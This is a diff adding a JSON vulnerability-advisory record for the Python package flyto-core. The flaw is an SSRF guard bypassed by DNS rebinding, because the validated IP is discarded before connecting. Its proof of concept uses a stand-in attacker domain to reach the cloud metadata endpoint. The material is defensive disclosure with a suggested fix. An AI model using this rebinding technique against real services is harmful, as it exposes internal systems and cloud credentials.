@@ -1,0 +1,56 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-11-20T00:09:24Z",
+  "Package": {
+    "Ecosystem": "PIP",
+    "Name": "flyto-core"
+  },
+  "Advisory": {
+    "DatabaseId": 537992,
+    "Id": "GSA_kwCzR0hTQS1wZmcyLXc5OTktNDk3ds4ACDWI",
+    "GhsaId": "GHSA-pfg2-w999-497v",
+    "References": [
+      {
+        "Url": "https://github.com/flytohub/flyto-core/security/advisories/GHSA-pfg2-w999-497v"
+      },
+      {
+        "Url": "https://github.com/flytohub/flyto-core/commit/bf748df864d348004cf45d830bc59f62c5c4a58a"
+      },
+      {
+        "Url": "https://github.com/flytohub/flyto-core/releases/tag/v2.26.8"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-pfg2-w999-497v"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-pfg2-w999-497v"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-77313"
+      }
+    ],
+    "Description": "## Summary\n`validate_url_ssrf` resolves the hostname, checks the IP against private ranges, then **discards the IP and returns the hostname URL string**. aiohttp performs a fresh, independent DNS resolution at connect time. An attacker controlling DNS for a hostname (TTL 0, alternating public IP and internal IP) passes validation on the first lookup and connects to the internal IP on the second — a classic check-then-use race. SECURITY_SSRF.md line 63 explicitly claims DNS-rebinding is prevented; it is not.\n\n## Root Cause\n`src/core/utils.py:523` returns the hostname URL after validation; the resolved IP is never pinned. A repo grep of `http/` and `utils.py` for `TCPConnector` / `resolver` / `response.history` / `on_request_redirect` / IP-pinning returns NONE. Each module builds a fresh `ClientSession` per call → the connect-time `getaddrinfo` is independent of the validation-time lookup.\n\n## Impact\nDefeats the SSRF guard on ALL modules that call it (readable internal fetch). Independent of IP-range completeness — the private IP is never presented to `is_private_ip`. Requires attacker DNS control + winning the resolution race → AC:H.\n\n## Proof of Concept\nCode-proven: `validate_url_ssrf` returns the hostname (utils.py:523); no pinned-IP connector anywhere. Two independent resolutions occur (validation-time and aiohttp connect-time).\n```\nattacker DNS: rebind.attacker.tld TTL 0, alternating public IP and the cloud metadata IP\nexecute_module http.get {\"url\":\"http://rebind.attacker.tld/latest/meta-data/...\"}\n```\n\n## Attack Chain\n1. Entry: `http.get {url:\"http://rebind.attacker.tld/...\"}`. Guard: `validate_url_with_env_config`. Bypass proof: `getaddrinfo(rebind.attacker.tld)` returns the public IP, `is_private_ip=False` (utils.py:511-519); returns the hostname URL (:523) — the IP is discarded.\n2. Sink: `session.get(\"http://rebind.attacker.tld/...\")` (get.py:116). aiohttp performs a FRESH independent `getaddrinfo` at connect → now resolves to the internal IP. Bypass proof: no `TCPConnector`/`AsyncResolver`/pinned-IP in `http/` (grep confirms none). Two lookups.\n3. Impact: internal fetch, body returned.\n\n## Bypass Evidence\n`utils.py:523` returns the hostname string, not a pinned IP; grep confirms no IP pinning or custom resolver anywhere on the path; fresh `ClientSession` per call guarantees an independent second resolution.\n\n## Affected Versions\n`\u003c= 2.26.6` — `utils.py:523` present on latest release tag; no pinning added on HEAD.\n\n## Suggested Fix\nResolve the hostname once, pin the validated IP, and connect to that IP (custom `TCPConnector`/resolver) — reject any connect-time resolution that differs. This is the fix SECURITY_SSRF.md already claims is in place.\n\n## Credit\n\nVulnerability discovered by zx (Jace).",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-11-20T00:09:23Z",
+    "Severity": "HIGH",
+    "Summary": "Flyto2 Core: SSRF guard validates the resolved IP but connects by hostname, allowing DNS-rebinding TOCTOU",
+    "UpdatedAt": "2026-11-20T00:09:24Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.1,
+      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.26.8"
+      },
+      "VulnerableVersionRange": "\u003c= 2.26.7"
+    }
+  ]
+}
